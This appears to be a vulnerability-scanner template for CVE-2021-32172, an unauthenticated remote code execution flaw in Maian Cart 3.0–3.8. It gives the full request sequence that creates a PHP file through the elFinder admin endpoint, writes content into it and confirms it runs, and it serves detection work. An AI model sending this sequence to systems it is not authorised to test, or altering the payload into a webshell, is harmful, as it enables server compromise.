id: CVE-2021-32172
info:
  name: Maian Cart <=3.8 - Remote Code Execution
  author: pdteam
  severity: critical
  description: Maian Cart version 3.0 to 3.8 is vulnerable to remote code execution
    via elFinder file manager plugin, as indicated in CVE-2021-32172.
  reference:
  - https://dreyand.github.io/maian-cart-rce/
  - https://github.com/DreyAnd/maian-cart-rce
  - https://www.maianscriptworld.co.uk/critical-updates
  - https://nvd.nist.gov/vuln/detail/CVE-2021-32172
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-32172
    cwe-id: CWE-862
  tags: cve,cve2021,rce,unauth,maian
  metadata:
    impact: The CVE-2021-32172 vulnerability in Maian Cart 3.0 to 3.8 can lead to
      remote code execution, allowing attackers to compromise the affected system.
    recommendation: It is recommended to immediately update Maian Cart to version
      3.9 or above to address the remote code execution vulnerability in the elFinder
      file manager plugin.
requests:
- raw:
  - 'GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={{randstr}}.php&target=l1_Lw
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  - 'POST /admin/index.php?p=ajax-ops&op=elfinder HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, /; q=0.01

    Accept-Language: en-US,en;q=0.5

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    cmd=put&target={{hash}}&content=%3c%3fphp%20echo%20%22{{randstr_1}}%22%3b%20%3f%3e

    '
  - 'GET /product-downloads/{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  extractors:
  - type: regex
    name: hash
    internal: true
    group: 1
    regex:
    - '"hash"\:"(.*?)"\,'
  req-condition: true
  matchers:
  - type: dsl
    dsl:
    - contains(body_3, "{{randstr_1}}")
    - status_code_3 == 200
    condition: and
